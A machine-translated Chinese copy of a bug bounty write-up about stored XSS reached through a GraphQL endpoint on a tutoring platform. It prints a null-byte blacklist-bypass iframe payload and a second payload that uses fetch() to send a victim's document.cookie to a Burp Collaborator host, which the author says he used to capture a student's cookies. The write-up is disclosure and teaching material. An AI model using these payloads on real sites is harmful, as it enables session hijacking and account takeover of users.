<html>
<head>
<title>Pwning your assignments: Stored XSS via GraphQL endpoint</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Pwning您的分配:通过GraphQL端点存储XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5?source=collection_archive---------1-----------------------#2021-04-18">https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5?source=collection_archive---------1-----------------------#2021-04-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="36d3" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">背景</h1><p id="330a" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">这个bug是在一个高度成熟的bug bounty程序中发现的，该程序作为一个公共/私人程序在各种众包平台上运行了4-5年。事实上，这个程序已经停止运行，而且这个错误是在5个月前报告的，所以我决定在社区里分享这个错误:)<br/>所以让我们开始吧！</p><p id="42fa" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">当我开始研究这个程序时，它报告了700多个错误，因此由于这个程序的成熟，它有奖金。我花了2-3天时间观察目标，一无所获。大约一个星期后，我和一个随机的大学朋友进行了讨论，他告诉我关于通过帮助年轻学生的平台赚钱的事情。令人惊讶的是，这是我追求的同一家公司。他谈到的辅导功能是不能直接访问的。</p><p id="2f13" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在研究该特定功能时，我发现了以下情况:</p><ul class=""><li id="e66e" class="lo lp iq kn b ko lj ks lk kw lq la lr le ls li lt lu lv lw bi translated">它需要一个帐户注册。</li><li id="3d69" class="lo lp iq kn b ko lx ks ly kw lz la ma le mb li lt lu lv lw bi translated">通过一个我期待能帮助学生的测试。</li><li id="2f5c" class="lo lp iq kn b ko lx ks ly kw lz la ma le mb li lt lu lv lw bi translated">提交政府文件。身份证明。</li><li id="c1b3" class="lo lp iq kn b ko lx ks ly kw lz la ma le mb li lt lu lv lw bi translated">等待2周进行验证。</li></ul><p id="27b2" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我认为很难使用这个功能。因此，很多人可能不会深入应用程序。我申请了计算机科学辅导，通过了考试，现在我可以选择帮助学生做作业了！</p><figure class="mc md me mf gt mg"><div class="bz fp l di"><div class="mh mi l"/></div></figure><p id="5c52" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我决定在这里检查的bug类型有:CSRF、伊多尔和XSS。CSRF很快就失败了，因为每个请求都有大量的检查。此外，在UUIDv4被正确使用的情况下，IDOR对我来说并不实用。</p><h1 id="395a" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">XSS来了！</h1><p id="eea0" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">在回答问题时，我发现“，&gt;”是允许的，但是像script、iframe、alert等关键字被从答案中删除了。翻了一下<a class="ae mj" href="https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting-ebook/dp/B005LVQA9S" rel="noopener ugc nofollow" target="_blank"> Web Hacker's Handbook </a>，发现在<em class="mk">&gt;</em>前加了一个<em class="mk"> %00(空字节)</em>并没有对关键词进行净化。因此，我创建了以下有效负载:</p><pre class="mc md me mf gt ml mm mn mo aw mp bi"><span id="d4b0" class="mq jo iq mm b gy mr ms l mt mu">&lt;iframe %00 src=\"javascript:prompt(1)\"%00&gt;</span></pre><ul class=""><li id="bd7c" class="lo lp iq kn b ko lj ks lk kw lq la lr le ls li lt lu lv lw bi translated"><em class="mk"> %00 </em>绕开黑名单</li><li id="24b0" class="lo lp iq kn b ko lx ks ly kw lz la ma le mb li lt lu lv lw bi translated"><em class="mk"> \" </em>在GraphQL输入字段中传递双引号</li></ul><p id="fc39" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">上述有效载荷反映如下:</p><figure class="mc md me mf gt mg gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/8e1819c51c9b74cefa889b97e3af3af0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/format:webp/1*6dmbBfyPmnlDwTOcWRWQzw.png"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">源代码中的反射</figcaption></figure><p id="1758" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">而且我得到了有cookies的提示！</p><figure class="mc md me mf gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/13bfa6de360115d005e271de9047e8fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fJb2m1Rpsjy2aRqxguhx-g.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">XSS提示！</figcaption></figure><p id="9792" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我很快报告了这个bug，但是triager认为它是一个自我存储的XSS，并要求我演示影响。</p><p id="3317" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><strong class="kn ir">攻击场景/最终利用</strong> <br/>一名学生提出了一个疑问，教师用一个盲XSS有效载荷提交了答案。一旦学生检查了答案，他的cookies就会被传递给教师。因此，每次教师帮助学生时，他/她都可以接管学生的帐户！</p><p id="f31b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><strong class="kn ir">有效载荷:</strong></p><pre class="mc md me mf gt ml mm mn mo aw mp bi"><span id="6834" class="mq jo iq mm b gy mr ms l mt mu">&lt;iframe %00 src= javascript:fetch(\"//XXXXXXXXXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net/?param=\"+document.cookie)  %00&gt;</span></pre><ul class=""><li id="62c0" class="lo lp iq kn b ko lj ks lk kw lq la lr le ls li lt lu lv lw bi translated"><em class="mk"> fetch() </em>允许发出类似于XMLHttpRequest (XHR)的网络请求</li><li id="3156" class="lo lp iq kn b ko lx ks ly kw lz la ma le mb li lt lu lv lw bi translated"><em class="mk"> /？param= </em>添加以避免使其成为域的一部分</li></ul><p id="ccae" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我很快回答了一个学生的问题，并在解答的最后加上了上面的有效载荷。不到5分钟，学生检查了答案，瞧，我有了学生的饼干！</p><figure class="mc md me mf gt mg gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/6b7940f49a3de948b1359c7a6ca67723.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*njU3Cnch2a_LJUhcJ3MVOA.png"/></div></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">学生饼干拿来了</figcaption></figure><figure class="mc md me mf gt mg"><div class="bz fp l di"><div class="mh mi l"/></div></figure><p id="903c" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在对以前的报告进行修改后，它最终被接受为有效的调查结果。</p><figure class="mc md me mf gt mg gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/564f9695ac7c28d4e53f8c780c6bdc60.png" data-original-src="https://miro.medium.com/v2/resize:fit:552/format:webp/1*l6F9Qziz1_4CJ37Iwcqm_g.png"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">奖励:)</figcaption></figure><h1 id="356d" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">外卖食品</h1><p id="d209" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">保持好奇心，永远深入研究应用程序。其他黑客通常会忽略更难访问的功能。</p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><p id="bd50" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">感谢<a class="ae mj" href="https://twitter.com/debangshu_kundu" rel="noopener ugc nofollow" target="_blank"> Dk999 </a>校对文章:)</p><p id="fbf3" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">如果你对这个发现有疑问，请在<a class="ae mj" href="https://twitter.com/dominat0r98" rel="noopener ugc nofollow" target="_blank">推特</a>上给我留言。不久将披露更多的报道。狩猎愉快！</p></div></div>    
</body>
</html>